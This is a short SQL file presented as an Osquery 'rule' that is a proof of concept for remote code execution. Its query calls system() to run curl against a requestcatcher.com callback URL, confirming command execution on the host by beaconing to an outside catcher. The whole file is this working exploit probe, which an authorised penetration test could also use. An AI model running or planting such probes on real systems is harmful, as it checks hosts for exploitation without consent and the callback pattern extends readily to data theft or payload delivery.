-- Rule Name: RCE_Osquery_Callback_PoC
-- Description: This Osquery rule is a Proof of Concept (PoC) for Remote Code Execution.
-- It attempts to use the 'system()' table to execute an external command.
-- Successful execution will result in an HTTP callback to the specified Request Catcher URL,
-- proving the 'system' table is enabled and exploitable.
--
-- This rule is designed to run once and report its findings.

SELECT
  'RCE_Triggered' AS status,
  system('curl -m 5 https://deadmanxxxii.requestcatcher.com/osquery_rce_callback_2506242134') AS command_output,
  datetime('now', 'localtime') AS timestamp
FROM
  osquery_info;
